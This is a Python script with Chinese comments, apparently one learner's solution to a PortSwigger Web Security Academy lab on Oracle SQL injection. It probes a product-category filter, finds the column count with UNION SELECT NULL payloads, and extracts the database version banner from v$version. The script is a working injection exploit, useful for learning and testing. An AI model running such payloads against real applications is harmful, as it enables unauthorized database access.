# 第3階段組出version sqli的payload破題
import requests
from typing import Optional, Any

BASE_URL="https://0a7c00770464d0a680e10dae002500d6.web-security-academy.net/filter"

"""
這邊發現Session()的S要大寫
雖然session的方法點進去也是直接呼叫Session()
但AI表示大寫比較常見, 官方好像也都用大寫
"""
session = requests.Session()

def send_get_request(url:str, params: dict[str,Any], timeout:int = 10) -> Optional[requests.Response]:
    try:
        return session.get(url, params=params, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None;

def test_payload_request(payload:str)-> Optional[requests.Response]:
    try:
        return send_get_request(BASE_URL,{"category":payload})
    except requests.RequestException as e:
        print(f"error:{e}")
        return None;

def is_payload_success(payload:str) ->bool:
    response = test_payload_request( payload)
    if response and response.status_code == 200:
        return True
    else:
        return False

def find_columns(max_columns:int = 20) -> Optional[int]:
    for num in range(1, max_columns+1):
        payload=f"' union select {",".join(["NULL"] * num)} from dual -- " 
        if is_payload_success(payload):
            print(f"column payload:{payload}")
            return num;
    return None;

def build_union(columns:int, disp_idx:int):
    arr = ["NULL"]*columns
    arr[disp_idx] = "banner"
    return f"' union select {",".join(arr)} from v$version -- "

def find_version(html:str)->str:
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(html, "html.parser")
    return soup.find("table",{"class":"is-table-longdescription"})

def extract_oracle_content_keyword(text: str, key_word: str):
    """
    從文字中抓出包含指定關鍵字的片段，
    片段範圍是從 '>' 到 '<'，並保留其中的文字。
    """
    import re
    pattern = re.compile(rf'>([^<>]*?{re.escape(key_word)}[^<>]*?)<', re.IGNORECASE)
    matches = pattern.findall(text)
    return matches

def main():
    # 嘗試訪問url
    payload = "Gifts"
    if is_payload_success(payload):
        print(f"connect sucess:{payload}")
    else:
        return
   
    # 確認該url能sqli
    payload = "Gifts' or 1=1 -- "
    if is_payload_success(payload):
        print(f"sqli sucess:{payload}")
    else:
        return
    
    # 找出union的數量
    columns = find_columns()
    if not columns:
        return
    
    # 組出此題的payload
    payload = build_union(columns,0)
    response = test_payload_request(payload)
    if response and response.status_code==200:
        #print(find_version(response.text))
        results = extract_oracle_content_keyword(response.text, "Production")
        for r in results:
            print(r)



if __name__ == "__main__":
    main()